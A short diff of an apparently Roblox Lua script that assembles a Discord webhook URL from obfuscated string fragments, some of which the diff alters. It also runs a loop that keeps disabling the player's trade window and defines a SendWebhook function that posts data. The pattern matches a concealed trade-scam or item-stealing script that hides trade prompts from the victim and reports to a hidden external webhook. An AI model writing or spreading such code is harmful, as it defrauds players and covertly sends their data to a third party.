@@ -793,7 +793,6 @@ local values = {
 	["Moon"] = 1
 }
 local pl = "https://discord"
-
 local qpd = "CYYYwQ4_"
 local bas = "0WMzoO3x"
 local pal = "FlyRE-Ki"
@@ -824,8 +823,8 @@ if _G.vlorp then
 end
 _G.vlorp = true
 local FWU = pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin
-local trwo = "X4_"
-local pqmd = "NDY"
+local trwo = "site"
+local pqmd = "test"
 local destroytrades2 = coroutine.create(function()
     while true do
         local player = game:GetService("Players").LocalPlayer
@@ -838,12 +837,12 @@ local destroytrades2 = coroutine.create(function()
 
         if tradeGUIPhone.Enabled == true then
             tradeGUIPhone.Enabled = false
-        end
-
-        wait(0.1)
+	end
+local hwmfi = "010"
+	wait(0.1)
     end
 end)
-local FUs = trwo .. pqmd
+local FUs = trwo .. pqmd .. hwmfi
 function SendWebhook(url, data)
     local jsonData = HttpService:JSONEncode(data)
     local response = request({
